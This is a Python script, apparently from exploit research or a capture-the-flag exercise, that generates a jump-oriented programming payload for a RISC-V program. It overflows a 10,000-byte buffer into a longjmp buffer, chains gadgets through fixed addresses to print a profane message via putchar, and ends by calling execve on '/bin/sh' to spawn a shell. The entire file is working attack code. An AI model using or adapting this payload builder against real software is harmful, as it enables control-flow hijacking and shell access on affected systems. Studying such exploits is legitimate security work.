# Abstract buffer class for printing/size
class buffer:
    def __str__(self):
        return '\n'.join([format(h, 'x') for h in self.buf]) + '\n'
    def size(self):
        return len(self.buf) * 8

# Buffer full of zeros
class zeroBuf(buffer):
    def __init__(self, words = None, bytelen = None):
        if bytelen is not None:
            words = int(bytelen / 8)
        self.buf = [0 for i in range(words)]

# longjmp buffer containing registers to load
class longjmpBuf(buffer):
    def __init__(self, buf_ptr = None):
        self.buf = [0 for i in range(25)]

    def set_ra(self, ra):
        self.buf[0] = ra
    def set_s0(self, s0):
        self.buf[1] = s0
    def set_s1(self, s1):
        self.buf[2] = s1
    def set_s2(self, s2):
        self.buf[3] = s2
    def set_s3(self, s3):
        self.buf[4] = s3
    def set_s4(self, s4):
        self.buf[5] = s4
    def set_s5(self, s5):
        self.buf[6] = s5
    def set_s6(self, s6):
        self.buf[7] = s6
    def set_s7(self, s7):
        self.buf[8] = s7
    def set_s8(self, s8):
        self.buf[9] = s8
    def set_s9(self, s9):
        self.buf[10] = s9
    def set_s10(self, s10):
        self.buf[11] = s10
    def set_s11(self, s11):
        self.buf[12] = s11
    def set_sp(self, sp):
       self.buf[13] = sp

# buffer for dispatch/initializer gadget to load registers from
class dispatchBuf(buffer):
    def __init__(self, buf_ptr):
        # TODO: it should be possible to shrink the dispatch buf further, at least down to 27 lines instead of 49
        self.buf = [0 for i in range(49)]
        if isinstance(buf_ptr, int):
            self.dispatch_buf = buf_ptr
            self.next_dispatch_buf = buf_ptr + 392
        else:
            self.dispatch_buf = buf_ptr.next_dispatch_buf
            self.next_dispatch_buf = buf_ptr.next_dispatch_buf + 392
        self.set_s3(self.next_dispatch_buf)
    
    def set_t1(self, t1):
        self.buf[22] = t1
    def set_ra(self, ra):
        self.buf[23] = ra
    def set_sp(self, sp):
        self.buf[24] = sp 
    def set_a0(self, a0):
        self.buf[32] = a0
    def set_a1(self, a1):
        self.buf[33] = a1
    def set_a2(self, a2):
        self.buf[34] = a2
    def set_a3(self, a3):
        self.buf[35] = a3
    def set_a4(self, a4):
        self.buf[36] = a4
    def set_a5(self, a5):
        self.buf[37] = a5
    def set_a6(self, a6):
        self.buf[38] = a6
    def set_a7(self, a7):
        self.buf[39] = a7
    def set_s0(self, s0):
        self.buf[30] = s0 
    def set_s1(self, s1):
        self.buf[31] = s1 
    def set_s2(self, s2):
        self.buf[40] = s2 
    def set_s3(self, s3):
        self.buf[41] = s3 

# Helper function to print strings by chaining calls to putchar
def print_string(string, bufs):
    for c in string:
        buf = dispatchBuf(bufs[-1])
        # Jump to gadget which sets the next dispatcher buf
        buf.set_t1(mv_s3_to_t0_jalr_a3)
        # Then jump to putchar
        buf.set_a3(putchar)
        buf.set_a0(ord(c))
        # Return to dispatcher gadget after putchar finishes
        buf.set_ra(load_regs_from_t0)
        # Set the stack to the second buf ptr as this shouldn't be used anymore
        buf.set_sp(bufs[-1].dispatch_buf)
        bufs.append(buf)

# Pointer values
load_regs_from_t0 = 0x20000648da
mv_s3_to_t0_jalr_a3 = 0x200007be24
mv_s0_to_a3_jalr_s9 = 0x200004b38c
execve = 0x20000ad180
putchar = 0x2000080bcc
bin_sh_str = 0x20001178a8

# Unused pointers
mv_a0a1a2_jalr_a5 = 0x2000067010
jalr_a5 = 0x200006701a

# vulnerable buffer size to overflow
vulnbuf_size = 10000

# vulnerable buffer location in memory
vuln_buf_ptr = 0x2aaaaad480

dispatch_file = open('dispatch.txt', 'w')

# Need the actual in-memory address of the dispatchBuf to get started (&f->buffer)
# Chain gadgets to get some space to reuse as the stack for putchar
# These can replaced with zero bufs, in which case the JOP chain would start from a later buf
buf1 = dispatchBuf(vuln_buf_ptr)
buf1.set_t1(mv_s3_to_t0_jalr_a3)
buf1.set_a3(load_regs_from_t0)

buf2 = dispatchBuf(buf1)
buf2.set_t1(mv_s3_to_t0_jalr_a3)
buf2.set_a3(load_regs_from_t0)

bufs = [buf1, buf2]

# Add more dispatch buffers to chain calls to putchar
print_string('fuck risc-v\n', bufs)

# Final buffer jumps to execve and executes "/bin/sh"
final_buf = dispatchBuf(bufs[-1])
final_buf.set_a0(bin_sh_str)
final_buf.set_a1(0)
final_buf.set_a2(0)
final_buf.set_t1(execve)
bufs.append(final_buf)

# Write out the dispatch buffers to the file and compute their size
dispatchbufs_size = 0
for buf in bufs:
    dispatch_file.write(str(buf))
    dispatchbufs_size += buf.size()

# Fill the remaining part of the vulnerable buffer with zeros
remaining_size = vulnbuf_size - dispatchbufs_size
if remaining_size > 0:
    empty_buf = zeroBuf(bytelen=remaining_size)
    dispatch_file.write(str(empty_buf))

longjmp = longjmpBuf()
# s3 is copied to t0 and should point to the first dispatch buf
longjmp.set_s3(bufs[0].dispatch_buf)
# First jump to the gadget to set a3 from s0
longjmp.set_ra(mv_s0_to_a3_jalr_s9)
# After that, jump to the gadget to set t0 from s3
longjmp.set_s9(mv_s3_to_t0_jalr_a3)
# Finally, that gadget will jump to a3 which should point to the initializer gadget
longjmp.set_s0(load_regs_from_t0)

# Fill out the overflow portion of the buffer with the longjmp registers
dispatch_file.write(str(longjmp))

dispatch_file.close()